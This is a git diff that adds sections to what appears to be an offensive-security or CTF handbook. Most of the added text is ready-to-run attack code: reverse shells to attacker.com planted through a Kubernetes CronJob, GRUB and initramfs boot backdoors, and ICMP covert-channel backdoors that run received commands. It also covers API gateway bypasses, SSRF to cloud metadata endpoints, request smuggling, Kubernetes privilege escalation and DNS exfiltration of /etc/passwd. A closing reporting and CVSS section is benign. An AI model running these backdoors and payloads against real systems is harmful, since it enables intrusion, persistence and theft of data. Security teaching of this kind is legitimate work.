+              nsenter -t 1 -m -u -n -i bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &
+          restartPolicy: OnFailure
+EOF
+
+kubectl apply -f backdoor-cronjob.yaml
+```
+
+### Boot Process Backdoors
+
+**GRUB Backdoor**
+
+```bash
+# Add backdoor kernel parameter
+sed -i 's/GRUB_CMDLINE_LINUX=""/GRUB_CMDLINE_LINUX="init=\/tmp\/backdoor.sh"/' /etc/default/grub
+update-grub
+
+cat > /tmp/backdoor.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
+exec /sbin/init "$@"
+EOF
+chmod +x /tmp/backdoor.sh
+```
+
+**Initramfs Backdoor**
+
+```bash
+# Unpack initramfs
+mkdir /tmp/initramfs
+cd /tmp/initramfs
+unmkinitramfs /boot/initrd.img-$(uname -r) .
+
+# Add backdoor script
+cat > init_backdoor.sh << 'EOF'
+#!/bin/sh
+bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
+EOF
+chmod +x init_backdoor.sh
+
+# Modify init script to call backdoor
+sed -i '2i /init_backdoor.sh' init
+
+# Repack initramfs
+find . | cpio -o -H newc | gzip > /boot/initrd.img-$(uname -r).backdoor
+# Replace original
+mv /boot/initrd.img-$(uname -r).backdoor /boot/initrd.img-$(uname -r)
+```
+
+### Firmware Backdoors
+
+[Unverified] Firmware modification requires specific hardware knowledge and tools:
+
+```bash
+# UEFI/BIOS backdoor concept (requires specific tools)
+# Extract BIOS firmware
+flashrom -r bios_backup.bin
+
+# Modify firmware (requires UEFITool or similar)
+# Add DXE driver with backdoor payload
+# This is highly system-specific
+
+# Flash modified firmware
+flashrom -w modified_bios.bin
+```
+
+### Covert Channel Backdoors
+
+**Timing-Based Backdoor**
+
+```bash
+cat > timing_backdoor.sh << 'EOF'
+#!/bin/bash
+# Communication via ICMP timing intervals
+# Interval < 100ms = binary 0, > 100ms = binary 1
+
+while true; do
+    data=$(nc -l -p 9999)
+    for char in $(echo "$data" | fold -w1); do
+        binary=$(echo "obase=2; $(printf '%d' "'$char")" | bc)
+        for bit in $(echo "$binary" | fold -w1); do
+            ping -c 1 attacker.com > /dev/null
+            if [ "$bit" = "1" ]; then
+                sleep 0.15
+            else
+                sleep 0.05
+            fi
+        done
+    done
+done
+EOF
+```
+
+**ICMP Data Backdoor**
+
+```bash
+# Backdoor command via ICMP payload
+cat > icmp_backdoor.sh << 'EOF'
+#!/bin/bash
+tcpdump -i any -n icmp -l | while read line; do
+    cmd=$(echo "$line" | grep -oP 'length \K\d+' | xxd -r -p)
+    if [ -n "$cmd" ]; then
+        eval "$cmd" | while read output; do
+            ping -c 1 -p "$(echo "$output" | xxd -p)" attacker.com
+        done
+    fi
+done
+EOF
+```
+
+Important subtopics for deeper exploitation understanding:
+
+- **Privilege Escalation** - Kernel exploits, SUID abuse, capability exploitation, sudo misconfigurations
+- **Container Escape Techniques** - Docker breakout methods, Kubernetes privilege escalation, cgroup manipulation
+- **Memory Forensics Evasion** - Anti-debugging, process injection, rootkit techniques
+- **Network Pivot Hardening** - Encrypted C2 channels, domain fronting, protocol tunneling over allowed services
 
 ---
 
@@ -33668,8 +46370,711 @@ curl -X PATCH http://kong-admin.target.com:8001/routes/ROUTE_ID \
 
 # Disable authentication plugin for route
 curl -X PATCH http://kong-admin.target.com:8001/routes/ROUTE_ID \
-     -H "
+     -H "Content-Type: application/json"  
+-d '{"plugins": []}'
+
+# Delete rate limiting plugin
+
+curl -X DELETE http://kong-admin.target.com:8001/plugins/PLUGIN_ID
+````
+
+**Kong Service Discovery Poisoning**
+
+```bash
+# Add malicious upstream target
+curl -X POST http://kong-admin.target.com:8001/upstreams/UPSTREAM_NAME/targets \
+     -d "target=attacker.com:8080" \
+     -d "weight=1000"
+
+# Create service pointing to internal resource
+curl -X POST http://kong-admin.target.com:8001/services \
+     -d "name=internal-ssrf" \
+     -d "url=http://169.254.169.254/latest/meta-data/"
+
+# Create route to expose it
+curl -X POST http://kong-admin.target.com:8001/routes \
+     -d "service.id=SERVICE_ID" \
+     -d "paths[]=/internal"
+
+# Access internal metadata
+curl http://api.target.com/internal/iam/security-credentials/
+````
+
+### AWS API Gateway Bypass
+
+**API Gateway Enumeration**
+
+```bash
+# Find API Gateway endpoints
+curl https://API_ID.execute-api.REGION.amazonaws.com/STAGE/
+
+# List stages
+aws apigateway get-stages --rest-api-id API_ID
+
+# Get API keys
+aws apigateway get-api-keys --include-values
+
+# Export API configuration
+aws apigateway get-export \
+    --rest-api-id API_ID \
+    --stage-name prod \
+    --export-type swagger swagger.json
+
+# Get authorizers
+aws apigateway get-authorizers --rest-api-id API_ID
 ```
+
+**Lambda Authorizer Bypass**
+
+```bash
+# Test without authorization header
+curl https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# Test with malformed token
+curl -H "Authorization: Bearer invalid" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# Test with expired token
+curl -H "Authorization: Bearer EXPIRED_TOKEN" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# Event injection to authorizer
+curl -H "Authorization: Bearer token" \
+     -H "X-Forwarded-For: 127.0.0.1" \
+     -H "X-Amz-Source-Arn: arn:aws:execute-api:*:*:*" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+```
+
+**API Gateway HTTP Header Manipulation**
+
+```bash
+# Host header injection
+curl -H "Host: attacker.com" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# X-Forwarded-Host manipulation
+curl -H "X-Forwarded-Host: internal-service.local" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# X-Amzn headers
+curl -H "X-Amzn-Trace-Id: Root=1-override" \
+     -H "X-Amzn-Request-Id: custom-id" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+```
+
+**Resource Policy Bypass**
+
+```bash
+# Test source IP restrictions
+curl https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# Via CloudFront (if whitelisted)
+curl -H "X-Forwarded-For: CLOUDFRONT_IP" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# VPC endpoint bypass
+# If resource policy allows specific VPC endpoint
+curl -H "X-Amzn-Vpce-Id: vpce-WHITELIST_ID" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+```
+
+**Stage Variable Injection**
+
+[Unverified] Stage variables in Lambda integration may be exploitable if user input is incorporated:
+
+```bash
+# Test stage variable injection
+curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint?stage=\${stageVariables.internalEndpoint}"
+
+# HTTP parameter pollution
+curl "https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint?url=\${stageVariables.backendUrl}"
+```
+
+### Azure API Management (APIM) Bypass
+
+**APIM Policy Exploitation**
+
+```bash
+# Access APIM management endpoint
+curl https://APIM_NAME.management.azure-api.net/
+
+# List APIs
+az apim api list --resource-group RG_NAME --service-name APIM_NAME
+
+# Get API policy
+az apim api policy show \
+    --resource-group RG_NAME \
+    --service-name APIM_NAME \
+    --api-id API_ID
+
+# Test rate limiting bypass
+for i in {1..1000}; do
+    curl -H "Ocp-Apim-Subscription-Key: KEY" \
+         https://APIM_NAME.azure-api.net/api/endpoint &
+done
+```
+
+**Subscription Key Bypass**
+
+```bash
+# Test without subscription key
+curl https://APIM_NAME.azure-api.net/api/endpoint
+
+# Test with invalid key
+curl -H "Ocp-Apim-Subscription-Key: invalid" \
+     https://APIM_NAME.azure-api.net/api/endpoint
+
+# Alternative header names
+curl -H "Subscription-Key: KEY" \
+     https://APIM_NAME.azure-api.net/api/endpoint
+
+curl -H "Api-Key: KEY" \
+     https://APIM_NAME.azure-api.net/api/endpoint
+
+# Query parameter bypass
+curl "https://APIM_NAME.azure-api.net/api/endpoint?subscription-key=KEY"
+```
+
+**Backend URL Manipulation**
+
+```bash
+# Inbound policy SSRF
+curl https://APIM_NAME.azure-api.net/api/endpoint \
+     -H "X-Backend-Url: http://169.254.169.254/metadata/instance"
+
+# Backend override
+curl https://APIM_NAME.azure-api.net/api/endpoint \
+     -H "X-Forwarded-Host: internal-backend.local"
+
+# Path manipulation
+curl "https://APIM_NAME.azure-api.net/api/../admin/endpoint"
+```
+
+### Google Cloud Endpoints Bypass
+
+**Endpoints Service Control**
+
+```bash
+# Enumerate endpoints
+gcloud endpoints services list
+
+# Describe endpoint
+gcloud endpoints services describe SERVICE_NAME
+
+# Get OpenAPI spec
+gcloud endpoints services describe SERVICE_NAME --format=json | \
+    jq -r '.serviceConfig.documentation.rules[].description'
+
+# Test authentication bypass
+curl https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint
+
+# JWT bypass
+curl -H "Authorization: Bearer eyJhbGc" \
+     https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint
+```
+
+**ESP (Extensible Service Proxy) Bypass**
+
+```bash
+# Direct backend access bypassing ESP
+curl http://BACKEND_SERVICE:8080/api/endpoint
+
+# Kubernetes internal DNS
+curl http://backend-service.default.svc.cluster.local:8080/api/endpoint
+
+# Test API key bypass
+curl https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint
+curl -H "X-API-Key: invalid" \
+     https://SERVICE_NAME.endpoints.PROJECT_ID.cloud.goog/api/endpoint
+```
+
+### Traefik API Gateway Bypass
+
+**Traefik Dashboard Access**
+
+```bash
+# Default dashboard endpoint
+curl http://traefik.target.com:8080/dashboard/
+
+# API endpoint
+curl http://traefik.target.com:8080/api/rawdata
+
+# Get routers
+curl http://traefik.target.com:8080/api/http/routers | jq .
+
+# Get services
+curl http://traefik.target.com:8080/api/http/services | jq .
+
+# Get middlewares
+curl http://traefik.target.com:8080/api/http/middlewares | jq .
+```
+
+**Traefik Middleware Bypass**
+
+```bash
+# Test authentication middleware bypass
+curl http://api.target.com/admin
+
+# Header manipulation
+curl -H "X-Forwarded-User: admin" http://api.target.com/admin
+curl -H "X-Traefik-Override: true" http://api.target.com/admin
+
+# Path prefix bypass
+curl http://api.target.com//admin
+curl http://api.target.com/api/../admin
+curl "http://api.target.com/admin%2f"
+
+# Host header manipulation
+curl -H "Host: internal.target.com" http://api.target.com/admin
+```
+
+**Traefik Route Priority Exploitation**
+
+```bash
+# Identify route priorities
+curl http://traefik.target.com:8080/api/http/routers | \
+    jq '.[] | {name: .name, rule: .rule, priority: .priority}'
+
+# Test overlapping routes with different priorities
+curl http://api.target.com/api/users/admin
+curl http://api.target.com/api/admin
+curl "http://api.target.com/api/users/..%2fadmin"
+```
+
+### Nginx/OpenResty Gateway Bypass
+
+**Lua Script Exploitation**
+
+[Inference] Nginx with OpenResty may have vulnerabilities in custom Lua authentication scripts:
+
+```bash
+# Test Lua injection in headers
+curl -H "X-Auth-Token: '; os.execute('id') --" \
+     http://api.target.com/endpoint
+
+# Bypass Lua authentication
+curl -H "X-Auth-Token: nil" http://api.target.com/endpoint
+curl -H "X-Auth-Token: " http://api.target.com/endpoint
+
+# Boolean injection
+curl -H "X-Auth-Token: true" http://api.target.com/endpoint
+curl -H "X-Auth-Token: 1" http://api.target.com/endpoint
+```
+
+**Location Block Bypass**
+
+```bash
+# Standard request (blocked)
+curl http://api.target.com/admin
+
+# URL encoding
+curl http://api.target.com/%61dmin
+curl http://api.target.com/admin%2f
+
+# Case manipulation (if case-insensitive)
+curl http://api.target.com/Admin
+curl http://api.target.com/ADMIN
+
+# Path traversal
+curl http://api.target.com/api/../admin
+curl http://api.target.com/./admin
+
+# Null byte (older Nginx versions)
+curl "http://api.target.com/admin%00"
+curl "http://api.target.com/admin%00.html"
+
+# Double slash
+curl http://api.target.com//admin
+curl http://api.target.com/api//admin
+```
+
+**Nginx Variable Injection**
+
+```bash
+# Test if user input reaches Nginx variables
+curl "http://api.target.com/api?url=http://attacker.com"
+
+# $uri manipulation
+curl "http://api.target.com/redirect?next=/admin"
+curl "http://api.target.com/redirect?next=//attacker.com"
+
+# $args manipulation
+curl "http://api.target.com/api?debug=1&internal=true"
+```
+
+### HAProxy API Gateway Bypass
+
+**HAProxy Stats Interface**
+
+```bash
+# Access stats interface
+curl http://haproxy.target.com:8404/stats
+curl -u admin:password http://haproxy.target.com:8404/stats
+
+# CSV format
+curl http://haproxy.target.com:8404/stats;csv
+
+# JSON format (HAProxy 2.0+)
+curl http://haproxy.target.com:8404/stats;json
+
+# Disable server
+curl -X POST "http://haproxy.target.com:8404/stats?action=disable&b=backend&s=server1"
+```
+
+**ACL Bypass**
+
+```bash
+# Test ACL bypass techniques
+# Path-based ACL
+curl http://api.target.com/admin
+curl http://api.target.com/Admin
+curl http://api.target.com/ADMIN
+curl http://api.target.com//admin
+curl http://api.target.com/./admin
+
+# Header-based ACL
+curl -H "X-Forwarded-For: 127.0.0.1" http://api.target.com/admin
+curl -H "X-Real-IP: 10.0.0.1" http://api.target.com/admin
+
+# Method-based ACL
+curl -X POST http://api.target.com/read-only-endpoint
+curl -X HEAD http://api.target.com/admin
+```
+
+**Backend Server Direct Access**
+
+```bash
+# Identify backend servers from stats
+curl http://haproxy.target.com:8404/stats | grep -oP 'server\d+.*?:\d+'
+
+# Direct connection bypassing HAProxy
+curl http://backend1.internal:8080/admin
+curl http://10.0.1.100:8080/admin
+
+# DNS rebinding attack
+# Point attacker.com to HAProxy IP initially
+# Then rebind to internal backend IP
+```
+
+### API Gateway Path Normalization Bypass
+
+**Path Traversal Variations**
+
+```bash
+# Standard path traversal
+curl http://api.target.com/api/../admin
+curl http://api.target.com/api/../../admin
+
+# URL encoded
+curl http://api.target.com/api/%2e%2e/admin
+curl http://api.target.com/api/%2e%2e%2fadmin
+
+# Double URL encoded
+curl http://api.target.com/api/%252e%252e/admin
+
+# Unicode encoding
+curl http://api.target.com/api/%c0%ae%c0%ae/admin
+curl http://api.target.com/api/%u002e%u002e/admin
+
+# Mixed encoding
+curl http://api.target.com/api/..%2fadmin
+curl http://api.target.com/api/%2e./admin
+```
+
+**HTTP Request Smuggling**
+
+```bash
+# CL.TE (Content-Length vs Transfer-Encoding)
+printf 'POST /api HTTP/1.1\r\n'\
+'Host: api.target.com\r\n'\
+'Content-Length: 48\r\n'\
+'Transfer-Encoding: chunked\r\n'\
+'\r\n'\
+'0\r\n'\
+'\r\n'\
+'GET /admin HTTP/1.1\r\n'\
+'Host: api.target.com\r\n'\
+'\r\n' | nc api.target.com 80
+
+# TE.CL (Transfer-Encoding vs Content-Length)
+printf 'POST /api HTTP/1.1\r\n'\
+'Host: api.target.com\r\n'\
+'Content-Length: 4\r\n'\
+'Transfer-Encoding: chunked\r\n'\
+'\r\n'\
+'5c\r\n'\
+'GET /admin HTTP/1.1\r\n'\
+'Host: api.target.com\r\n'\
+'\r\n'\
+'0\r\n'\
+'\r\n' | nc api.target.com 80
+
+# Using Burp Turbo Intruder or custom script
+python3 smuggle.py --url http://api.target.com --type CL.TE
+```
+
+**HTTP/2 Smuggling**
+
+```bash
+# Install h2 tools
+pip3 install h2
+
+# H2 request with smuggled H1 request
+python3 << 'EOF'
+from h2.connection import H2Connection
+import socket
+
+sock = socket.create_connection(('api.target.com', 443))
+# ... TLS wrapper ...
+
+# Send H2 request with smuggled GET
+conn = H2Connection()
+conn.initiate_connection()
+
+headers = [
+    (':method', 'POST'),
+    (':path', '/api'),
+    (':authority', 'api.target.com'),
+    ('content-length', '100'),
+]
+
+smuggled = "GET /admin HTTP/1.1\r\nHost: api.target.com\r\n\r\n"
+conn.send_headers(1, headers)
+conn.send_data(1, smuggled.encode())
+EOF
+```
+
+### Gateway Response Manipulation
+
+**Cache Poisoning**
+
+```bash
+# Host header poisoning
+curl -H "Host: attacker.com" \
+     -H "X-Forwarded-Host: attacker.com" \
+     http://api.target.com/cached-resource
+
+# Cache key manipulation
+curl -H "X-Cache-Key: malicious" \
+     http://api.target.com/endpoint
+
+# Vary header exploitation
+curl -H "User-Agent: poison" \
+     -H "X-Original-URL: /admin" \
+     http://api.target.com/cached-page
+```
+
+**Response Header Injection**
+
+```bash
+# CRLF injection in headers
+curl "http://api.target.com/redirect?url=http://attacker.com%0d%0aX-Injected:%20header"
+
+# Set-Cookie injection
+curl "http://api.target.com/endpoint?param=value%0d%0aSet-Cookie:%20admin=true"
+
+# Location header injection
+curl "http://api.target.com/redirect?next=/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"
+```
+
+### Rate Limiting and Throttling Bypass at Gateway
+
+**Distributed Attack from Gateway**
+
+```bash
+# Bypass gateway rate limits using multiple identifiers
+#!/bin/bash
+for i in {1..1000}; do
+    # Rotate identifiers
+    user_agent="Mozilla/5.0 (Bot $i)"
+    ip="10.0.$((i/254)).$((i%254))"
+    session="session_$RANDOM"
+    
+    curl -H "User-Agent: $user_agent" \
+         -H "X-Forwarded-For: $ip" \
+         -H "Cookie: PHPSESSID=$session" \
+         http://api.target.com/endpoint &
+done
+wait
+```
+
+**Gateway-Specific Headers**
+
+```bash
+# Kong bypass
+curl -H "X-Kong-Limit: 999999" http://api.target.com/endpoint
+
+# AWS API Gateway
+curl -H "X-Amzn-ApiGateway-Api-Key: OVERRIDE" \
+     https://API_ID.execute-api.REGION.amazonaws.com/prod/endpoint
+
+# Azure APIM
+curl -H "Ocp-Apim-Trace: true" \
+     -H "Rate-Limit-Bypass: true" \
+     https://APIM_NAME.azure-api.net/api/endpoint
+```
+
+---
+
+## Kubernetes-Specific Exploitation
+
+### Pod Security Context Abuse
+
+**Privileged Escalation**
+
+```bash
+# Check current security context
+kubectl get pod POD_NAME -o yaml | grep -A 10 securityContext
+
+# Deploy privileged pod
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privileged-pod
+spec:
+  containers:
+  - name: shell
+    image: alpine
+    command: ["/bin/sh"]
+    stdin: true
+    tty: true
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+EOF
+
+# Access host filesystem
+kubectl exec -it privileged-pod -- chroot /host
+```
+
+**HostPath Volume Exploitation**
+
+```bash
+# Mount host Docker socket
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: docker-socket-pod
+spec:
+  containers:
+  - name: docker
+    image: docker:latest
+    command: ["/bin/sh"]
+    stdin: true
+    tty: true
+    volumeMounts:
+    - name: docker-sock
+      mountPath: /var/run/docker.sock
+  volumes:
+  - name: docker-sock
+    hostPath:
+      path: /var/run/docker.sock
+EOF
+
+# Control host Docker daemon
+kubectl exec -it docker-socket-pod -- docker ps
+kubectl exec -it docker-socket-pod -- docker run --privileged -v /:/host alpine
+```
+
+### RBAC Exploitation
+
+**Role Enumeration**
+
+```bash
+# Check current permissions
+kubectl auth can-i --list
+
+# List all roles
+kubectl get roles -A
+kubectl get clusterroles
+
+# Describe specific role
+kubectl describe role ROLE_NAME -n NAMESPACE
+kubectl describe clusterrole CLUSTER_ROLE_NAME
+
+# Check bindings
+kubectl get rolebindings -A
+kubectl get clusterrolebindings
+
+# Who can perform actions
+kubectl auth can-i create pods --as=system:serviceaccount:default:default
+kubectl auth can-i get secrets --as=USER_NAME
+```
+
+**Privilege Escalation via RBAC**
+
+```bash
+# Create malicious rolebinding
+cat <<EOF | kubectl apply -f -
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: escalate
+  namespace: default
+subjects:
+- kind: ServiceAccount
+  name: default
+  namespace: default
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+EOF
+
+# Use elevated privileges
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+kubectl --token=$TOKEN get secrets -A
+```
+
+### Network Policy Bypass
+
+**Test Network Policies**
+
+```bash
+# List network policies
+kubectl get networkpolicies -A
+
+# Describe policy
+kubectl describe networkpolicy POLICY_NAME -n NAMESPACE
+
+# Test connectivity from pod
+kubectl run test-pod --image=alpine --rm -it -- sh
+# Inside pod:
+wget -qO- http://restricted-service.namespace:8080
+nc -zv restricted-service.namespace 8080
+```
+
+**Egress Bypass**
+
+```bash
+# DNS tunneling for egress bypass
+kubectl exec -it POD_NAME -- sh
+# Inside pod:
+nslookup `base64 /etc/passwd | head -c50`.attacker.com
+
+# ICMP tunneling
+ping -c 1 -p $(echo "data" | xxd -p) attacker.com
+```
+
+---
+
+## Important Related Topics
+
+For comprehensive cloud-native security testing:
+
+- **Container runtime exploitation (containerd, CRI-O)** - Runtime-specific vulnerabilities
+- **Serverless function exploitation** - AWS Lambda, Azure Functions, GCP Cloud Functions security
+- **Cloud provider metadata service exploitation** - IMDS vulnerabilities across AWS/Azure/GCP
+- **Infrastructure as Code (IaC) analysis** - Terraform/CloudFormation/ARM template vulnerabilities
+- **CI/CD pipeline exploitation** - Jenkins, GitLab CI, GitHub Actions security
 
 ---
 
@@ -37759,5 +51164,4150 @@ nmap --script vuln $TARGET
 nikto -h http://$TARGET -Tuning 123
 
 # 4. If SSH accessible, check config
-sshd -T | grep -E '(PermitRootLogin|
+sshd -T | grep -E '(PermitRootLogin|PasswordAuthentication|PermitEmptyPasswords)'
+
+# 5. Check for common misconfigurations
+
+curl -sI http://$TARGET | grep -i server curl -s http://$TARGET/robots.txt curl -s http://$TARGET/.git/config
+
+# 6. If you have shell access, run rapid audit
+
+find / -perm -4000 2>/dev/null # SUID binaries sudo -l # Sudo permissions cat /etc/crontab # Scheduled tasks
 ```
+
+## Important Related Topics
+
+- **Cloud-Specific Misconfiguration Scanning** (S3 buckets, IAM policies, Security Groups)
+- **Active Directory Configuration Auditing** (Bloodhound, PingCastle, Group Policy analysis)
+- **API Security Configuration Testing** (Broken authentication, excessive data exposure, rate limiting)
+- **Mobile Application Configuration Review** (AndroidManifest.xml, Info.plist, certificate pinning)
+
+---
+
+# Reporting & Documentation
+
+## Finding Classification
+
+Finding classification is the systematic categorization of security vulnerabilities based on their type, impact, and exploitability to enable consistent tracking and remediation prioritization.
+
+### Vulnerability Classification Taxonomies
+
+**OWASP Classification:**
+
+Primary categories for web/cloud applications:
+
+- **Injection Flaws**: SQL injection, command injection, LDAP injection, XML injection, template injection
+- **Broken Authentication**: Session fixation, weak password policies, missing MFA, credential stuffing vectors
+- **Sensitive Data Exposure**: Unencrypted storage, weak cryptography, exposed configuration files, information disclosure
+- **XML External Entities (XXE)**: XML parser exploitation, SSRF via XXE, file disclosure
+- **Broken Access Control**: IDOR, path traversal, privilege escalation, missing function-level access control
+- **Security Misconfiguration**: Default credentials, unnecessary services, verbose error messages, missing security headers
+- **Cross-Site Scripting (XSS)**: Reflected XSS, stored XSS, DOM-based XSS
+- **Insecure Deserialization**: Remote code execution via deserialization, object injection
+- **Using Components with Known Vulnerabilities**: Outdated libraries, unpatched frameworks
+- **Insufficient Logging & Monitoring**: Missing audit logs, delayed intrusion detection
+
+**CWE (Common Weakness Enumeration) Mapping:**
+
+```bash
+# Common CWE classifications for CTF findings
+CWE-22: Path Traversal
+CWE-78: OS Command Injection
+CWE-79: Cross-site Scripting
+CWE-89: SQL Injection
+CWE-94: Code Injection
+CWE-287: Improper Authentication
+CWE-352: Cross-Site Request Forgery
+CWE-434: Unrestricted File Upload
+CWE-502: Deserialization of Untrusted Data
+CWE-798: Use of Hard-coded Credentials
+```
+
+**Cloud-Specific Classification:**
+
+AWS/Azure/GCP vulnerability categories:
+
+- **IAM Misconfiguration**: Overly permissive roles, missing MFA, unused credentials
+- **Storage Exposure**: Public S3/Blob/GCS buckets, unauthenticated access, loose CORS policies
+- **Network Segmentation Failures**: Overly permissive security groups, missing VPC isolation, open management ports
+- **Secrets Management Issues**: Hard-coded credentials, plaintext API keys, exposed environment variables
+- **Logging & Monitoring Gaps**: Disabled CloudTrail/Activity Logs, missing alerts, insufficient retention
+- **Encryption Deficiencies**: Unencrypted storage, data in transit without TLS, weak key management
+- **Resource Exposure**: Public IP assignments, internet-facing databases, exposed metadata services
+- **Supply Chain Vulnerabilities**: Compromised container images, malicious Lambda layers, untrusted Terraform modules
+
+**Infrastructure Classification:**
+
+- **Container Security**: Privileged containers, exposed Docker sockets, vulnerable base images
+- **Kubernetes Security**: RBAC bypasses, exposed API servers, pod escape vectors
+- **CI/CD Pipeline Flaws**: Pipeline injection, insecure artifact storage, credential leakage in logs
+- **Serverless Issues**: Function over-permissions, event injection, cold start exploitation
+
+### Classification Process
+
+**Step 1: Identify Attack Vector**
+
+```
+Network (N): Remotely exploitable
+Adjacent (A): Local network access required
+Local (L): Local system access required
+Physical (P): Physical access required
+```
+
+**Step 2: Determine Vulnerability Type**
+
+```bash
+# Create standardized finding template
+cat > finding_template.md <<EOF
+## Finding Classification
+
+**Title**: [Descriptive vulnerability name]
+**Type**: [OWASP/CWE category]
+**CWE-ID**: [Specific CWE number]
+**Attack Vector**: [Network/Adjacent/Local/Physical]
+**Asset**: [Affected system/application/service]
+**Component**: [Specific component or function]
+
+## Technical Classification
+
+**Vulnerability Class**: [Injection/Authentication/Configuration/etc.]
+**Exploitation Complexity**: [Low/Medium/High]
+**Authentication Required**: [Yes/No]
+**User Interaction**: [Required/Not Required]
+**Scope**: [Unchanged/Changed]
+
+## Impact Classification
+
+**Confidentiality Impact**: [None/Low/High]
+**Integrity Impact**: [None/Low/High]
+**Availability Impact**: [None/Low/High]
+**Business Impact**: [Critical/High/Medium/Low/Informational]
+EOF
+```
+
+**Step 3: Tag with Metadata**
+
+```bash
+# Example finding tags for searchability
+Tags: [RCE, AWS, IAM, Privilege-Escalation, Authentication-Bypass]
+Platform: [Linux, Windows, Cloud, Web, Mobile]
+Technology: [Python, Node.js, Docker, Kubernetes, Lambda]
+Environment: [Production, Staging, Development]
+```
+
+### Classification Examples
+
+**Example 1: Cloud IAM Privilege Escalation**
+
+```
+Title: AWS IAM Role Privilege Escalation via iam:PassRole
+Type: Broken Access Control
+CWE-ID: CWE-269 (Improper Privilege Management)
+Attack Vector: Network
+Asset: AWS Account ID 123456789012
+Component: IAM Role "DeveloperRole"
+
+Vulnerability Class: Privilege Escalation
+Exploitation Complexity: Low
+Authentication Required: Yes (AWS credentials required)
+User Interaction: Not Required
+Scope: Changed (escalate to different role context)
+
+Confidentiality Impact: High (access to sensitive data)
+Integrity Impact: High (modify infrastructure)
+Availability Impact: High (delete resources)
+Business Impact: Critical
+```
+
+**Example 2: Container Escape via Privileged Pod**
+
+```
+Title: Kubernetes Privileged Pod Escape to Host Root Access
+Type: Security Misconfiguration
+CWE-ID: CWE-250 (Execution with Unnecessary Privileges)
+Attack Vector: Local
+Asset: Kubernetes Cluster "prod-cluster-01"
+Component: Pod "debug-pod" in namespace "default"
+
+Vulnerability Class: Container Escape
+Exploitation Complexity: Low
+Authentication Required: Yes (pod exec permissions)
+User Interaction: Not Required
+Scope: Changed (escape container to host)
+
+Confidentiality Impact: High (host filesystem access)
+Integrity Impact: High (host system modification)
+Availability Impact: High (cluster compromise)
+Business Impact: Critical
+```
+
+## Severity Scoring (CVSS)
+
+CVSS (Common Vulnerability Scoring System) provides standardized vulnerability severity ratings using a numerical score from 0.0 to 10.0.
+
+### CVSS v3.1 Scoring Methodology
+
+**Base Metrics:**
+
+**Attack Vector (AV):**
+
+```
+Network (N) = 0.85: Remotely exploitable
+Adjacent (A) = 0.62: Adjacent network access
+Local (L) = 0.55: Local access required
+Physical (P) = 0.2: Physical access required
+```
+
+**Attack Complexity (AC):**
+
+```
+Low (L) = 0.77: No special conditions
+High (H) = 0.44: Special conditions required
+```
+
+**Privileges Required (PR):**
+
+```
+None (N) = 0.85: No authentication needed
+Low (L) = 0.62 (unchanged) / 0.68 (changed): Basic user privileges
+High (H) = 0.27 (unchanged) / 0.50 (changed): Admin/elevated privileges
+```
+
+**User Interaction (UI):**
+
+```
+None (N) = 0.85: No user interaction
+Required (R) = 0.62: Requires user action
+```
+
+**Scope (S):**
+
+```
+Unchanged (U): Vulnerability confined to vulnerable component
+Changed (C): Impacts resources beyond vulnerable component
+```
+
+**Confidentiality Impact (C):**
+
+```
+High (H) = 0.56: Total information disclosure
+Low (L) = 0.22: Some information disclosure
+None (N) = 0: No impact
+```
+
+**Integrity Impact (I):**
+
+```
+High (H) = 0.56: Total compromise of integrity
+Low (L) = 0.22: Limited modification capability
+None (N) = 0: No impact
+```
+
+**Availability Impact (A):**
+
+```
+High (H) = 0.56: Total availability loss
+Low (L) = 0.22: Reduced availability
+None (N) = 0: No impact
+```
+
+### CVSS Calculation Process
+
+**Manual CVSS Scoring:**
+
+```bash
+# Use official CVSS calculator
+# https://www.first.org/cvss/calculator/3.1
+
+# Example: AWS IAM Privilege Escalation
+AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+
+# Breakdown:
+# AV:N - Network accessible (AWS API)
+# AC:L - Low complexity (simple API calls)
+# PR:L - Low privileges required (developer account)
+# UI:N - No user interaction needed
+# S:C - Scope changed (escalate to different role)
+# C:H - High confidentiality impact (access all data)
+# I:H - High integrity impact (modify infrastructure)
+# A:H - High availability impact (delete resources)
+
+# Base Score: 9.9 (Critical)
+```
+
+**Automated CVSS Calculation Script:**
+
+```python
+#!/usr/bin/env python3
+# cvss_calculator.py
+
+def calculate_impact_sub_score(c, i, a, scope):
+    """Calculate Impact sub-score"""
+    impact_values = {'N': 0, 'L': 0.22, 'H': 0.56}
+    
+    if scope == 'U':
+        impact = 6.42 * (1 - ((1 - impact_values[c]) * 
+                              (1 - impact_values[i]) * 
+                              (1 - impact_values[a])))
+    else:  # scope == 'C'
+        impact = 7.52 * (1 - ((1 - impact_values[c]) * 
+                              (1 - impact_values[i]) * 
